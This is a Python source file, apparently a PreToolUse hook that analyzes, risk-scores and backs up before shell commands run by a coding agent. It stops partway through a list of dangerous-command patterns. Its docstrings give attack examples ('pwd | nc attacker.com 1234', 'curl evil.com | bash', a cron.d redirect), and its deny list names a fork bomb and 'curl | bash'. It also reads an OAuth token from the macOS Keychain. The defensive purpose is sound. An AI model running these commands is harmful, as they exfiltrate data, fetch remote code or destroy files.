#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Deliberate - Command Analysis Hook

PreToolUse hook that explains what shell commands will do before execution.
Multi-layer architecture for robust classification:

  Layer 1: Pattern matching + ML model (fast, immune to prompt injection)
  Layer 2: LLM explanation (natural language, configurable provider)

https://github.com/the-radar/deliberate
"""

import hashlib
import json
import os
import random
import re
import subprocess
import sys
import tempfile
import urllib.error
import urllib.request
from datetime import datetime
from pathlib import Path

# Configuration
CLASSIFIER_URL = "http://localhost:8765/classify/command"

# Support both plugin mode (CLAUDE_PLUGIN_ROOT) and npm install mode (~/.deliberate/)
# Plugin mode: config in plugin directory
# npm mode: config in ~/.deliberate/
PLUGIN_ROOT = os.environ.get('CLAUDE_PLUGIN_ROOT')
if PLUGIN_ROOT:
    CONFIG_FILE = str(Path(PLUGIN_ROOT) / ".deliberate" / "config.json")
else:
    CONFIG_FILE = str(Path.home() / ".deliberate" / "config.json")

TIMEOUT_SECONDS = 30
CLASSIFIER_TIMEOUT = 5  # Classifier should be fast
DEBUG = False
USE_CLASSIFIER = True  # Try classifier first if available

# Session state for deduplication


def get_state_file(session_id: str) -> str:
    """Get session-specific state file path."""
    return os.path.expanduser(f"~/.claude/deliberate_cmd_state_{session_id}.json")


def get_history_file(session_id: str) -> str:
    """Get session-specific command history file path."""
    return os.path.expanduser(f"~/.claude/deliberate_cmd_history_{session_id}.json")


def cleanup_old_state_files():
    """Remove state and history files older than 7 days (runs 10% of the time)."""
    if random.random() > 0.1:
        return
    try:
        state_dir = os.path.expanduser("~/.claude")
        if not os.path.exists(state_dir):
            return
        current_time = datetime.now().timestamp()
        seven_days_ago = current_time - (7 * 24 * 60 * 60)
        for filename in os.listdir(state_dir):
            # Clean up state files, history files, and cache files
            if filename.startswith("deliberate_") and filename.endswith(".json"):
                file_path = os.path.join(state_dir, filename)
                try:
                    if os.path.getmtime(file_path) < seven_days_ago:
                        os.remove(file_path)
                except (OSError, IOError):
                    pass
    except Exception:
        pass


def load_state(session_id: str) -> set:
    """Load the set of already-shown warning keys for this session."""
    state_file = get_state_file(session_id)
    if os.path.exists(state_file):
        try:
            with open(state_file, 'r') as f:
                return set(json.load(f))
        except (json.JSONDecodeError, IOError):
            return set()
    return set()


# Workflow patterns that indicate dangerous sequences
# Format: (pattern_name, required_commands, risk_level, description)
WORKFLOW_PATTERNS = [
    ("REPO_WIPE", ["git rm", "git push --force"], "CRITICAL",
     "Repository wipe: removing files from git and force pushing rewrites history permanently"),
    ("REPO_WIPE", ["rm -rf", "git add", "git push --force"], "CRITICAL",
     "Repository restructure with force push: deleting files and force pushing can destroy code"),
    ("MASS_DELETE", ["rm -rf", "rm -rf", "rm -rf"], "HIGH",
     "Multiple recursive deletions in sequence - high risk of unintended data loss"),
    ("HISTORY_REWRITE", ["git reset --hard", "git push --force"], "CRITICAL",
     "History rewrite: hard reset + force push permanently destroys commit history"),
    ("HISTORY_REWRITE", ["git rebase", "git push --force"], "CRITICAL",
     "History rewrite: rebase + force push rewrites shared history"),
    ("UNCOMMITTED_RISK", ["git stash", "git checkout", "rm"], "HIGH",
     "Uncommitted changes at risk: stashing, switching branches, and deleting files"),
    ("TEMP_SWAP", ["cp", "rm -rf", "cp"], "HIGH",
     "Temp directory swap pattern: copying to temp, deleting original, copying back - easy to lose data"),
    ("ENV_DESTRUCTION", ["unset", "rm .env"], "HIGH",
     "Environment destruction: unsetting variables and deleting env files"),
]


def load_command_history(session_id: str) -> dict:
    """Load command history for this session.

    Returns dict with:
    - commands: list of {command, risk, timestamp, explanation}
    - cumulative_risk: current session risk level
    - patterns_detected: list of detected workflow patterns
    - files_at_risk: set of files that could be affected
    """
    history_file = get_history_file(session_id)
    default_history = {
        "commands": [],
        "cumulative_risk": "LOW",
        "patterns_detected": [],
        "files_at_risk": []
    }

    if os.path.exists(history_file):
        try:
            with open(history_file, 'r') as f:
                history = json.load(f)
                # Ensure all keys exist
                for key in default_history:
                    if key not in history:
                        history[key] = default_history[key]
                return history
        except (json.JSONDecodeError, IOError):
            return default_history
    return default_history


def save_command_history(session_id: str, history: dict):
    """Save command history for this session."""
    history_file = get_history_file(session_id)
    try:
        os.makedirs(os.path.dirname(history_file), exist_ok=True)
        with open(history_file, 'w') as f:
            json.dump(history, f, indent=2)
    except IOError:
        pass


def extract_affected_paths(command: str) -> list:
    """Extract file/directory paths that could be affected by a command.

    Looks for paths in common destructive commands like rm, mv, cp, git rm, etc.
    """
    paths = []

    # Patterns for extracting paths from various commands
    # rm -rf /path or rm -rf path
    rm_match = re.findall(r'rm\s+(?:-[rfivd]+\s+)*([^\s|;&>]+)', command)
    paths.extend(rm_match)

    # git rm -rf path
    git_rm_match = re.findall(r'git\s+rm\s+(?:-[rf]+\s+)*([^\s|;&>]+)', command)
    paths.extend(git_rm_match)

    # mv source dest - source is at risk
    mv_match = re.findall(r'mv\s+(?:-[fiv]+\s+)*([^\s|;&>]+)\s+', command)
    paths.extend(mv_match)

    # Filter out flags and special chars
    paths = [p for p in paths if not p.startswith('-') and p not in ['.', '..', '/']]

    return paths


def detect_workflow_patterns(history: dict, current_command: str, window_size: int = 3) -> list:
    """Detect dangerous workflow patterns from recent command history + current command.

    Uses a sliding window to only look at the last N commands, avoiding stale pattern
    matches from old commands that are no longer relevant to the current context.

    Args:
        history: Command history dict with "commands" list
        current_command: The command being analyzed
        window_size: Number of recent commands to consider (default 3)

    Returns list of (pattern_name, risk_level, description) for detected patterns.
    """
    detected = []

    # Only look at the last N commands (sliding window)
    all_history_commands = [cmd["command"] for cmd in history.get("commands", [])]
    recent_commands = all_history_commands[-window_size:] if all_history_commands else []
    recent_commands.append(current_command)

    # Check each workflow pattern against recent commands only
    for pattern_name, required_cmds, risk_level, description in WORKFLOW_PATTERNS:
        # Check if all required command patterns appear in sequence within the window
        found_all = True
        last_idx = -1

        for required in required_cmds:
            found_this = False
            for idx, cmd in enumerate(recent_commands):
                if idx > last_idx and required.lower() in cmd.lower():
                    found_this = True
                    last_idx = idx
                    break

            if not found_this:
                found_all = False
                break

        if found_all:
            detected.append((pattern_name, risk_level, description))

    return detected


RISK_LEVELS = {"LOW": 0, "MODERATE": 1, "HIGH": 2, "CRITICAL": 3}
RISK_NAMES = {v: k for k, v in RISK_LEVELS.items()}


def calculate_cumulative_risk(history: dict, current_risk: str) -> str:
    """Calculate cumulative session risk based on history and current command.

    Risk escalates based on:
    - Number of DANGEROUS commands
    - Detected workflow patterns
    - Files at risk
    """
    max_risk = RISK_LEVELS.get(current_risk, 1)

    dangerous_count = 0
    for cmd in history.get("commands", []):
        cmd_risk = cmd.get("risk", "MODERATE")
        if cmd_risk == "DANGEROUS":
            dangerous_count += 1
        max_risk = max(max_risk, RISK_LEVELS.get(cmd_risk, 1))

    if dangerous_count >= 5:
        max_risk = max(max_risk, RISK_LEVELS["CRITICAL"])
    elif dangerous_count >= 3:
        max_risk = max(max_risk, RISK_LEVELS["HIGH"])

    for pattern in history.get("patterns_detected", []):
        pattern_risk = pattern[1] if len(pattern) > 1 else "HIGH"
        max_risk = max(max_risk, RISK_LEVELS.get(pattern_risk, 2))

    return RISK_NAMES.get(max_risk, "MODERATE")


def get_destruction_consequences(command: str, cwd: str = ".") -> dict | None:
    """Analyze what a destructive command will actually delete/modify.

    Returns dict with:
    - files: list of files that will be affected
    - dirs: list of directories that will be affected
    - total_lines: estimated lines of code at risk
    - total_size: total size in bytes
    - warning: human-readable consequence summary
    - type: the type of destruction (rm, git_reset, git_clean, etc.)

    Returns None if command is not destructive or paths don't exist.
    """
    consequences = {
        "files": [],
        "dirs": [],
        "total_lines": 0,
        "total_size": 0,
        "warning": "",
        "type": None
    }

    # Check for git reset --hard (discards uncommitted changes)
    if re.search(r'git\s+reset\s+--hard', command):
        return _analyze_git_reset_hard(cwd, consequences)

    # Check for git clean (removes untracked files)
    if re.search(r'git\s+clean', command):
        return _analyze_git_clean(cwd, consequences)

    # Check for git checkout -- (discards uncommitted changes to tracked files)
    if re.search(r'git\s+checkout\s+--', command) or re.search(r'git\s+checkout\s+\.\s*$', command):
        return _analyze_git_checkout_discard(cwd, consequences)

    # Check for git stash drop (permanently deletes stashed changes)
    if re.search(r'git\s+stash\s+drop', command):
        return _analyze_git_stash_drop(cwd, command, consequences)

    # Detect rm commands and extract targets
    rm_pattern = r'rm\s+(?:-[rfivd]+\s+)*(.+?)(?:\s*[|;&>]|$)'
    rm_match = re.search(rm_pattern, command)

    # Detect git rm commands
    git_rm_pattern = r'git\s+rm\s+(?:-[rf]+\s+)*(.+?)(?:\s*[|;&>]|$)'
    git_rm_match = re.search(git_rm_pattern, command)

    targets = []
    if rm_match:
        # Split by spaces but respect quotes
        target_str = rm_match.group(1).strip()
        targets = target_str.split()
        consequences["type"] = "rm"
    elif git_rm_match:
        target_str = git_rm_match.group(1).strip()
        targets = target_str.split()
        consequences["type"] = "git_rm"

    if not targets:
        return None

    # Analyze each target
    for target in targets:
        if target.startswith('-'):
            continue  # Skip flags

        # Expand path relative to cwd
        if not os.path.isabs(target):
            target = os.path.join(cwd, target)
        target = os.path.expanduser(target)

        # Handle glob patterns
        if '*' in target or '?' in target:
            import glob
            expanded = glob.glob(target, recursive=True)
            for path in expanded:
                _analyze_path(path, consequences)
        elif os.path.exists(target):
            _analyze_path(target, consequences)

    # Generate warning message
    if consequences["files"] or consequences["dirs"]:
        file_count = len(consequences["files"])
        dir_count = len(consequences["dirs"])
        lines = consequences["total_lines"]
        size_kb = consequences["total_size"] / 1024

        parts = []
        if file_count:
            parts.append(f"{file_count} file{'s' if file_count > 1 else ''}")
        if dir_count:
            parts.append(f"{dir_count} director{'ies' if dir_count > 1 else 'y'}")

        consequences["warning"] = f"⚠️  WILL DELETE: {', '.join(parts)}"
        if lines > 0:
            consequences["warning"] += f" ({lines:,} lines of code)"
        if size_kb > 1:
            consequences["warning"] += f" [{size_kb:.1f} KB]"

        # Show preview of what will be deleted
        preview_files = consequences["files"][:10]
        if preview_files:
            consequences["warning"] += "\n    Files:"
            for f in preview_files:
                consequences["warning"] += f"\n      - {f}"
            if len(consequences["files"]) > 10:
                consequences["warning"] += f"\n      ... and {len(consequences['files']) - 10} more"

        return consequences

    return None


def _analyze_path(path: str, consequences: dict):
    """Helper to analyze a single path and add to consequences."""
    try:
        if os.path.isfile(path):
            consequences["files"].append(path)
            size, lines = _count_file_stats(path)
            consequences["total_size"] += size
            consequences["total_lines"] += lines

        elif os.path.isdir(path):
            consequences["dirs"].append(path)
            for root, _, files in os.walk(path):
                for filename in files:
                    filepath = os.path.join(root, filename)
                    consequences["files"].append(filepath)
                    size, lines = _count_file_stats(filepath)
                    consequences["total_size"] += size
                    consequences["total_lines"] += lines
    except (OSError, PermissionError):
        pass


def _analyze_git_reset_hard(cwd: str, consequences: dict) -> dict | None:
    """Analyze what git reset --hard will discard.

    Runs git diff HEAD to see uncommitted changes that will be lost.
    """
    consequences["type"] = "git_reset_hard"

    try:
        # Get list of modified files
        status_result = subprocess.run(
            ["git", "status", "--porcelain"],
            capture_output=True, text=True, timeout=10, cwd=cwd
        )

        if status_result.returncode != 0:
            return None  # Not a git repo

        if not status_result.stdout.strip():
            return None  # No uncommitted changes, reset is safe

        # Parse modified files
        for line in status_result.stdout.strip().split('\n'):
            if len(line) >= 3:
                status = line[:2]
                filepath = line[3:].strip()

                # Handle renamed files (R  old -> new)
                if ' -> ' in filepath:
                    filepath = filepath.split(' -> ')[1]

                full_path = os.path.join(cwd, filepath)

                # M = modified, A = added, D = deleted, ? = untracked
                if status[0] in 'MA' or status[1] in 'MA':
                    consequences["files"].append(filepath)
                    if os.path.exists(full_path):
                        size, lines = _count_file_stats(full_path)
                        consequences["total_size"] += size
                        consequences["total_lines"] += lines

        # Get actual diff to show what changes will be lost
        diff_result = subprocess.run(
            ["git", "diff", "HEAD", "--stat"],
            capture_output=True, text=True, timeout=10, cwd=cwd
        )

        if not consequences["files"]:
            return None

        # Build warning message
        file_count = len(consequences["files"])
        lines = consequences["total_lines"]

        consequences["warning"] = f"⚠️  UNCOMMITTED CHANGES WILL BE DISCARDED: {file_count} file{'s' if file_count > 1 else ''}"
        if lines > 0:
            consequences["warning"] += f" ({lines:,} lines of changes)"

        consequences["warning"] += "\n    Modified files:"
        for f in consequences["files"][:10]:
            consequences["warning"] += f"\n      - {f}"
        if len(consequences["files"]) > 10:
            consequences["warning"] += f"\n      ... and {len(consequences['files']) - 10} more"

        if diff_result.stdout:
            # Add the stat summary
            stat_lines = diff_result.stdout.strip().split('\n')
            if stat_lines:
                consequences["warning"] += f"\n\n    {stat_lines[-1]}"  # Summary line like "5 files changed, 120 insertions(+), 30 deletions(-)"

        return consequences

    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
        return None


def _analyze_git_clean(cwd: str, consequences: dict) -> dict | None:
    """Analyze what git clean will remove.

    Runs git clean -n (dry run) to preview what would be deleted.
    """
    consequences["type"] = "git_clean"

    try:
        # Dry run to see what would be removed
        # -d includes directories, -f is required, -n is dry run
        clean_result = subprocess.run(
            ["git", "clean", "-dfn"],
            capture_output=True, text=True, timeout=10, cwd=cwd
        )

        if clean_result.returncode != 0:
            return None

        if not clean_result.stdout.strip():
            return None  # Nothing to clean

        # Parse output: "Would remove path/to/file"
        for line in clean_result.stdout.strip().split('\n'):
            if not line.startswith("Would remove "):
                continue

            filepath = line[len("Would remove "):].strip()
            full_path = os.path.join(cwd, filepath)

            if os.path.isdir(full_path):
                consequences["dirs"].append(filepath)
                for root, _, files in os.walk(full_path):
                    for filename in files:
                        fpath = os.path.join(root, filename)
                        consequences["files"].append(fpath)
                        size, lines = _count_file_stats(fpath)
                        consequences["total_size"] += size
                        consequences["total_lines"] += lines
            else:
                consequences["files"].append(filepath)
                if os.path.exists(full_path):
                    size, lines = _count_file_stats(full_path)
                    consequences["total_size"] += size
                    consequences["total_lines"] += lines

        if not consequences["files"] and not consequences["dirs"]:
            return None

        # Build warning
        file_count = len(consequences["files"])
        dir_count = len(consequences["dirs"])
        lines = consequences["total_lines"]

        consequences["warning"] = f"⚠️  UNTRACKED FILES WILL BE DELETED: {file_count} file{'s' if file_count != 1 else ''}"
        if dir_count:
            consequences["warning"] += f", {dir_count} director{'ies' if dir_count != 1 else 'y'}"
        if lines > 0:
            consequences["warning"] += f" ({lines:,} lines)"

        consequences["warning"] += "\n    Will remove:"
        for f in consequences["files"][:10]:
            consequences["warning"] += f"\n      - {f}"
        if len(consequences["files"]) > 10:
            consequences["warning"] += f"\n      ... and {len(consequences['files']) - 10} more"

        return consequences

    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
        return None


def _analyze_git_checkout_discard(cwd: str, consequences: dict) -> dict | None:
    """Analyze what git checkout -- will discard.

    Shows modified tracked files that will lose their changes.
    """
    consequences["type"] = "git_checkout_discard"

    try:
        # Get modified files (not staged)
        diff_result = subprocess.run(
            ["git", "diff", "--name-only"],
            capture_output=True, text=True, timeout=10, cwd=cwd
        )

        if diff_result.returncode != 0:
            return None

        if not diff_result.stdout.strip():
            return None  # No modifications to discard

        for filepath in diff_result.stdout.strip().split('\n'):
            filepath = filepath.strip()
            if not filepath:
                continue

            consequences["files"].append(filepath)
            full_path = os.path.join(cwd, filepath)

            if os.path.exists(full_path):
                size, lines = _count_file_stats(full_path)
                consequences["total_size"] += size
                consequences["total_lines"] += lines

        if not consequences["files"]:
            return None

        # Get diff stat for summary
        stat_result = subprocess.run(
            ["git", "diff", "--stat"],
            capture_output=True, text=True, timeout=10, cwd=cwd
        )

        file_count = len(consequences["files"])
        consequences["warning"] = f"⚠️  UNCOMMITTED CHANGES WILL BE DISCARDED: {file_count} file{'s' if file_count != 1 else ''}"

        consequences["warning"] += "\n    Modified files:"
        for f in consequences["files"][:10]:
            consequences["warning"] += f"\n      - {f}"
        if len(consequences["files"]) > 10:
            consequences["warning"] += f"\n      ... and {len(consequences['files']) - 10} more"

        if stat_result.stdout:
            stat_lines = stat_result.stdout.strip().split('\n')
            if stat_lines:
                consequences["warning"] += f"\n\n    {stat_lines[-1]}"

        return consequences

    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
        return None


def _analyze_git_stash_drop(cwd: str, command: str, consequences: dict) -> dict | None:
    """Analyze what git stash drop will permanently delete.

    Shows the content of the stash being dropped.
    """
    consequences["type"] = "git_stash_drop"

    try:
        # Parse which stash is being dropped (default is stash@{0})
        stash_ref = "stash@{0}"
        match = re.search(r'stash@\{(\d+)\}', command)
        if match:
            stash_ref = f"stash@{{{match.group(1)}}}"

        # Get stash info
        show_result = subprocess.run(
            ["git", "stash", "show", "--stat", stash_ref],
            capture_output=True, text=True, timeout=10, cwd=cwd
        )

        if show_result.returncode != 0:
            return None  # Stash doesn't exist

        # Parse files from stash show output
        for line in show_result.stdout.strip().split('\n'):
            # Lines look like: " file.txt | 10 +++---"
            if '|' in line:
                filepath = line.split('|')[0].strip()
                if filepath:
                    consequences["files"].append(filepath)

        if not consequences["files"]:
            return None

        file_count = len(consequences["files"])
        consequences["warning"] = f"⚠️  STASH WILL BE PERMANENTLY DELETED: {stash_ref} ({file_count} file{'s' if file_count != 1 else ''})"

        consequences["warning"] += "\n    Stashed changes:"
        for f in consequences["files"][:10]:
            consequences["warning"] += f"\n      - {f}"
        if len(consequences["files"]) > 10:
            consequences["warning"] += f"\n      ... and {len(consequences['files']) - 10} more"

        # Add the stat summary
        stat_lines = show_result.stdout.strip().split('\n')
        if stat_lines:
            consequences["warning"] += f"\n\n    {stat_lines[-1]}"

        return consequences

    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
        return None


TEXT_EXTENSIONS = {
    '.py', '.js', '.ts', '.tsx', '.jsx', '.json', '.yaml', '.yml',
    '.md', '.txt', '.sh', '.bash', '.zsh', '.fish',
    '.html', '.css', '.scss', '.sass', '.less',
    '.java', '.kt', '.scala', '.go', '.rs', '.rb', '.php',
    '.c', '.cpp', '.h', '.hpp', '.cs', '.swift', '.m',
    '.sql', '.graphql', '.proto', '.xml', '.toml', '.ini', '.cfg',
    '.env', '.gitignore', '.dockerignore', 'Makefile', 'Dockerfile',
    '.vue', '.svelte', '.astro'
}


def _is_text_file(path: str) -> bool:
    """Check if file is likely a text/code file based on extension."""
    _, ext = os.path.splitext(path)
    return ext.lower() in TEXT_EXTENSIONS or os.path.basename(path) in TEXT_EXTENSIONS


def _count_file_stats(filepath: str) -> tuple[int, int]:
    """Count size and lines for a file. Returns (size_bytes, line_count)."""
    try:
        size = os.path.getsize(filepath)
        lines = 0
        if _is_text_file(filepath):
            with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
                lines = sum(1 for _ in f)
        return size, lines
    except (IOError, PermissionError, OSError):
        return 0, 0


def get_backup_dir() -> str:
    """Get the Deliberate backup directory."""
    return os.path.expanduser("~/.deliberate/backups")


def create_pre_destruction_backup(
    session_id: str,
    command: str,
    cwd: str,
    consequences: dict | None,
    history: dict | None
) -> str | None:
    """Create automatic backup before CRITICAL operations.

    Backs up:
    - Files that will be affected (if consequences provided)
    - Current git state (branch, uncommitted changes)
    - Session command history (for context)

    Returns backup path if successful, None if backup failed/skipped.
    """
    import shutil

    backup_base = get_backup_dir()
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")

    # Create project-specific backup dir
    project_name = os.path.basename(cwd) or "unknown"
    backup_dir = os.path.join(backup_base, project_name, timestamp)

    try:
        os.makedirs(backup_dir, exist_ok=True)

        # 1. Track file mappings for restore
        file_mappings = []  # {"original": absolute path, "backup": relative path in backup}

        # 2. Backup files at risk (if we have them)
        if consequences and consequences.get("files"):
            files_dir = os.path.join(backup_dir, "files")
            os.makedirs(files_dir, exist_ok=True)

            backed_up = 0
            for filepath in consequences["files"][:100]:  # Limit to 100 files
                # Resolve to absolute path
                if os.path.isabs(filepath):
                    abs_path = filepath
                else:
                    abs_path = os.path.join(cwd, filepath)

                if os.path.exists(abs_path) and os.path.isfile(abs_path):
                    try:
                        # Preserve directory structure relative to cwd
                        rel_path = os.path.relpath(abs_path, cwd)
                        dest_path = os.path.join(files_dir, rel_path)
                        os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                        shutil.copy2(abs_path, dest_path)

                        # Track mapping for restore
                        file_mappings.append({
                            "original": abs_path,
                            "backup": os.path.join("files", rel_path)
                        })
                        backed_up += 1
                    except (IOError, OSError, shutil.Error):
                        pass

            debug(f"Backed up {backed_up} files to {files_dir}")

        # 3. Save metadata with file mappings for restore
        metadata = {
            "timestamp": datetime.now().isoformat(),
            "session_id": session_id,
            "command": command,
            "cwd": cwd,
            "consequences": consequences,
            "history": history,
            "file_mappings": file_mappings,  # For restore: original path -> backup path
            "version": "2.0"  # Metadata format version
        }
        with open(os.path.join(backup_dir, "metadata.json"), 'w') as f:
            json.dump(metadata, f, indent=2)

        # 3. Capture git state if in a repo
        git_dir = os.path.join(backup_dir, "git_state")
        os.makedirs(git_dir, exist_ok=True)

        try:
            # Get current branch
            branch_result = subprocess.run(
                ["git", "rev-parse", "--abbrev-ref", "HEAD"],
                capture_output=True, text=True, timeout=5, cwd=cwd
            )
            if branch_result.returncode == 0:
                with open(os.path.join(git_dir, "branch.txt"), 'w') as f:
                    f.write(branch_result.stdout.strip())

            # Get current commit
            commit_result = subprocess.run(
                ["git", "rev-parse", "HEAD"],
                capture_output=True, text=True, timeout=5, cwd=cwd
            )
            if commit_result.returncode == 0:
                with open(os.path.join(git_dir, "commit.txt"), 'w') as f:
                    f.write(commit_result.stdout.strip())

            # Get status
            status_result = subprocess.run(
                ["git", "status", "--porcelain"],
                capture_output=True, text=True, timeout=10, cwd=cwd
            )
            if status_result.returncode == 0:
                with open(os.path.join(git_dir, "status.txt"), 'w') as f:
                    f.write(status_result.stdout)

            # Get diff of uncommitted changes
            diff_result = subprocess.run(
                ["git", "diff", "HEAD"],
                capture_output=True, text=True, timeout=30, cwd=cwd
            )
            if diff_result.returncode == 0 and diff_result.stdout:
                with open(os.path.join(git_dir, "uncommitted.diff"), 'w') as f:
                    f.write(diff_result.stdout)

        except (subprocess.TimeoutExpired, FileNotFoundError):
            debug("Git state capture skipped (not a git repo or git unavailable)")

        debug(f"Created backup at {backup_dir}")
        return backup_dir

    except Exception as e:
        debug(f"Backup failed: {e}")
        return None


def load_backup_config() -> dict:
    """Load backup configuration from config file."""
    backup = _load_config().get("backup", {})
    return {
        "enabled": backup.get("enabled", True),
        "maxBackups": backup.get("maxBackups", 50),
        "riskThreshold": backup.get("riskThreshold", "CRITICAL")
    }


def add_command_to_history(session_id: str, command: str, risk: str, explanation: str):
    """Add a command to session history and update cumulative analysis."""
    history = load_command_history(session_id)

    # Add command entry
    history["commands"].append({
        "command": command[:500],  # Truncate long commands
        "risk": risk,
        "explanation": explanation[:200] if explanation else "",
        "timestamp": datetime.now().isoformat()
    })

    # Keep only last 50 commands to prevent unbounded growth
    if len(history["commands"]) > 50:
        history["commands"] = history["commands"][-50:]

    # Detect workflow patterns
    patterns = detect_workflow_patterns(history, command)
    if patterns:
        for pattern in patterns:
            if pattern not in history["patterns_detected"]:
                history["patterns_detected"].append(pattern)

    # Update cumulative risk
    history["cumulative_risk"] = calculate_cumulative_risk(history, risk)

    # Track files at risk
    affected_paths = extract_affected_paths(command)
    for path in affected_paths:
        if path not in history["files_at_risk"]:
            history["files_at_risk"].append(path)

    # Keep files_at_risk bounded
    if len(history["files_at_risk"]) > 100:
        history["files_at_risk"] = history["files_at_risk"][-100:]

    save_command_history(session_id, history)


def save_state(session_id: str, shown_warnings: set):
    """Save the set of shown warning keys."""
    state_file = get_state_file(session_id)
    try:
        os.makedirs(os.path.dirname(state_file), exist_ok=True)
        with open(state_file, 'w') as f:
            json.dump(list(shown_warnings), f)
    except IOError:
        pass


def get_warning_key(command: str) -> str:
    """Generate a unique key for deduplication based on command hash."""
    # MD5 used for cache key only, not security
    cmd_hash = hashlib.md5(command.encode(), usedforsecurity=False).hexdigest()[:12]
    return f"cmd-{cmd_hash}"


def get_cache_file(session_id: str, cmd_hash: str) -> str:
    """Get cache file for Pre/Post hook result sharing.

    Uses ~/.claude/ instead of /tmp for security - avoids symlink attacks
    and race conditions on shared systems.
    """
    return os.path.expanduser(f"~/.claude/deliberate_cmd_cache_{session_id}_{cmd_hash}.json")


def save_to_cache(session_id: str, cmd_hash: str, data: dict):
    """Save analysis result to cache for PostToolUse to read."""
    cache_file = get_cache_file(session_id, cmd_hash)
    try:
        with open(cache_file, 'w') as f:
            json.dump(data, f)
        debug(f"Cached result to {cache_file}")
    except IOError as e:
        debug(f"Failed to cache: {e}")


_config_cache = None


def _load_config() -> dict:
    """Load config from CONFIG_FILE with simple caching."""
    global _config_cache
    if _config_cache is not None:
        return _config_cache
    try:
        config_path = Path(CONFIG_FILE)
        if config_path.exists():
            with open(config_path, 'r', encoding='utf-8') as f:
                _config_cache = json.load(f)
                return _config_cache
    except Exception:
        pass
    _config_cache = {}
    return _config_cache


def load_blocking_config() -> dict:
    """Load blocking configuration from config file."""
    blocking = _load_config().get("blocking", {})
    return {
        "enabled": blocking.get("enabled", False),
        "confidenceThreshold": blocking.get("confidenceThreshold", 0.85)
    }


def load_dedup_config() -> bool:
    """Load deduplication config - returns True if dedup is enabled (default)."""
    return _load_config().get("deduplication", {}).get("enabled", True)


# Default trivial commands that are TRULY safe - no abuse potential
# These are skipped entirely (no analysis, no output) for performance
# SECURITY: Commands that can read sensitive files (cat, head, tail, less, more),
# leak secrets (env, printenv, echo), or execute commands (command) are NOT included
DEFAULT_SKIP_COMMANDS = {
    # Directory listing only (cannot read file contents)
    "ls", "ll", "la", "dir", "tree",
    # Current state queries (no sensitive data exposure)
    "pwd", "whoami", "hostname", "date", "uptime", "uname",
    # Binary location queries (safe - just paths)
    "which", "whereis", "type -t", "type -a",
    # Git read operations (repo metadata only)
    "git status", "git log", "git diff", "git branch", "git remote -v",
    "git blame", "git shortlog", "git tag", "git stash list",
}

# Shell operators that indicate chaining/piping/redirection - NEVER skip if present
# Even "safe" commands become dangerous when combined: ls && rm -rf /
DANGEROUS_SHELL_OPERATORS = {
    "|",      # Pipe - output can go to dangerous command
    ">",      # Redirect - can overwrite files
    ">>",     # Append redirect - can modify files
    ";",      # Command separator - can chain dangerous commands
    "&&",     # AND chain - can chain dangerous commands
    "||",     # OR chain - can chain dangerous commands
    "`",      # Backtick command substitution
    "$(",     # Modern command substitution
    "<",      # Input redirect (less dangerous but still risky)
    "&",      # Background execution / file descriptor redirect
}


def load_skip_commands() -> set:
    """Load skip commands list from config, with defaults."""
    skip_set = DEFAULT_SKIP_COMMANDS.copy()
    skip_config = _load_config().get("skipCommands", {})

    for cmd in skip_config.get("additional", []):
        skip_set.add(cmd)

    for cmd in skip_config.get("remove", []):
        skip_set.discard(cmd)

    return skip_set


def has_dangerous_operators(command: str) -> bool:
    """Check if command contains shell operators that could enable attacks.

    Even 'safe' commands become dangerous when chained or piped:
    - ls && rm -rf /
    - pwd; curl evil.com | bash
    - git status > /etc/cron.d/evil
    """
    return any(op in command for op in DANGEROUS_SHELL_OPERATORS)


def should_skip_command(command: str, skip_set: set) -> bool:
    """Check if command should be skipped (trivial, always safe).

    Returns True only if:
    1. Command starts with a skip-listed command (with proper word boundary)
    2. Command contains NO dangerous shell operators (|, >, ;, &&, etc.)

    This prevents attacks like:
    - 'ls && rm -rf /' (chaining)
    - 'pwd | nc attacker.com 1234' (piping)
    - 'git status > /etc/cron.d/evil' (redirection)
    """
    cmd_stripped = command.strip()

    # SECURITY: Never skip if command contains dangerous operators
    if has_dangerous_operators(cmd_stripped):
        return False

    for skip_cmd in skip_set:
        # Exact match
        if cmd_stripped == skip_cmd:
            return True
        # Command with args (e.g., "ls -la" matches "ls")
        if cmd_stripped.startswith(skip_cmd + " "):
            return True
        # Command with flags (e.g., "ls\t-la")
        if cmd_stripped.startswith(skip_cmd + "\t"):
            return True

    return False


def get_token_from_keychain():
    # type: () -> str | None
    """Get Claude Code OAuth token from macOS Keychain."""
    try:
        result = subprocess.run(
            ["/usr/bin/security", "find-generic-password", "-s", "Claude Code-credentials", "-w"],
            capture_output=True,
            text=True,
            timeout=5
        )
        if result.returncode != 0:
            return None

        credentials_json = result.stdout.strip()
        if not credentials_json:
            return None

        data = json.loads(credentials_json)
        token = data.get("claudeAiOauth", {}).get("accessToken")

        if token and token.startswith("sk-ant-oat01-"):
            return token
        return None
    except Exception:
        return None


def load_llm_config() -> dict | None:
    """Load LLM configuration from config file or keychain."""
    llm = _load_config().get("llm", {})
    provider = llm.get("provider")
    if not provider:
        return None

    api_key = llm.get("apiKey")
    if provider == "claude-subscription":
        keychain_token = get_token_from_keychain()
        if keychain_token:
            api_key = keychain_token

    return {
        "provider": provider,
        "base_url": llm.get("baseUrl"),
        "api_key": api_key,
        "model": llm.get("model")
    }

# Commands that are always safe (skip explanation) - fallback if classifier unavailable
SAFE_PREFIXES = [
    "ls", "pwd", "echo", "cat", "head", "tail", "wc", "which", "whoami",
    "date", "cal", "uptime", "hostname", "uname", "env", "printenv",
    "cd", "pushd", "popd", "dirs",
    "git status", "git log", "git diff", "git branch", "git show",
    "npm list", "npm outdated", "npm --version", "node --version",
    "python --version", "python3 --version", "pip list", "pip show",
    "pgrep", "ps aux", "top -l", "htop",
]

# Patterns that indicate potentially dangerous commands - fallback if classifier unavailable
DANGEROUS_PATTERNS = [
    "rm -rf", "rm -r", "rmdir",
    "sudo", "su ",
    "> /dev/", "dd if=",
    "chmod 777", "chmod -R",
    "mkfs", "fdisk", "parted",
    ":(){ :|:& };:",  # fork bomb
    "curl | sh", "curl | bash", "wget | sh", "wget | bash",
    "DROP ", "DELETE FROM", "TRUNCATE",
    "kubectl delete", "kubectl exec",
    "docker rm", "docker rmi", "docker system prune",
